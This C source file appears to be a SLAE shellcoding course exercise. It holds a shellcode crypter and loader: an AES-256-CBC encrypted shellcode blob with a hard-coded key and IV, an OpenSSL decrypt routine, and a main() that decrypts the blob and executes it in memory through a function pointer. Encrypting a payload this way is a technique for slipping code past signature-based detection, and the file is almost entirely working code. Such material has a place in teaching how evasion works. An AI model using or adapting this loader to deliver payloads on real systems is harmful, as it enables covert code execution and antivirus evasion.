#include <stdio.h>
#include <string.h>
/*
 * File Decryptor.c
 * Author: Saleh Bin Muhaysin
 * SLEA: SLAE-1101
 * Date: 25/12/2017
 */
 
// openSSL libraries (install libssl-dev before)
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>

// shellcode to encrypt
unsigned char encrypted_shell[] = \
"\x30\x43\x8b\x32\x18\x90\x70\xa0\x2b\x1a\x57\x44\xbf\xcd\xa5\xc2\x6e\xd0\x14\x8d\x68\xa2\x07\x72\xde\xdc\x4e\xa2\x79\xe4\xd9\xd1";
;

unsigned char key[] = "0123456789abcdef0123456789abcdef"; // A 256 bit key = 32 hex
unsigned char iv[] = "0123456789abcdef"; 		  // A 128 bit IV = 16 hex


// function get the shellcode to print and print it
void print_code_byte(unsigned char shellcode[]){
	for(int i = 0 ; i  < strlen(shellcode)  ; i++){
		printf("\\x%02x" , shellcode[i]);
	}
	printf("\n");
}

// function used to print any openssl errors during encryption
void handleErrors(void)
{
  ERR_print_errors_fp(stderr);
  abort();
}

// this function take the encrypted shellcode and its length, and the key with IV, and a pointer to where it should store the decrypted shellcode.
int decrypt(unsigned char *encrypted_shell, int encrypted_len, unsigned char *key, unsigned char *iv, unsigned char *shellcode) {
	EVP_CIPHER_CTX *ctx; // contain the context struct
	int len;
	int shellcode_len;
	// Create and initialise the context 
	if(!(ctx = EVP_CIPHER_CTX_new())) 
		handleErrors();
	// Initialise the decryption operation.
	if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
		handleErrors();
	// Provide the shellcode to be decrypted
	if(1 != EVP_DecryptUpdate(ctx, shellcode, &len, encrypted_shell, encrypted_len))
		handleErrors();
	shellcode_len = len;
	// Finalise the decryption.
	if(1 != EVP_DecryptFinal_ex(ctx, shellcode + len, &len)) 
		handleErrors();
	shellcode_len += len;
	// Clean up
	EVP_CIPHER_CTX_free(ctx);
	return shellcode_len;
}






int main(int argc, char *argv[] ){
	
	
	int encrypted_len = strlen(encrypted_shell);

	printf("[+] Encrypted Shellcode Length: %d\n" , encrypted_len);
	print_code_byte(encrypted_shell);
	
	// print the KEY and IV	
	printf("[+] AES 256-bit KEY: %s\n" , key);
	printf("[+] AES 128-bit IV: %s\n" , iv);
	
	// buffer for decrypted shellcode
	unsigned char shellcode[ 128 ];
	int shellcode_len;
	
	//initialize the library
	ERR_load_crypto_strings();
	OpenSSL_add_all_algorithms();
	OPENSSL_config(NULL);
	
	// decrypt the shellcode
	shellcode_len = decrypt(encrypted_shell, encrypted_len , key , iv , shellcode );
	
	// null the last byte of the decrypted shellcode
	shellcode[shellcode_len] = '\0';
	
	// print the decrypted shellcode
	printf("[+] Decrypted shellcode %d:\n" , shellcode_len);
	print_code_byte(shellcode);
	
	//clean up
	EVP_cleanup();
	ERR_free_strings();
	
	// jump to excute the shellcode
	int (*ret)() = (int(*)())shellcode;
	ret();
	
	return 0;
}

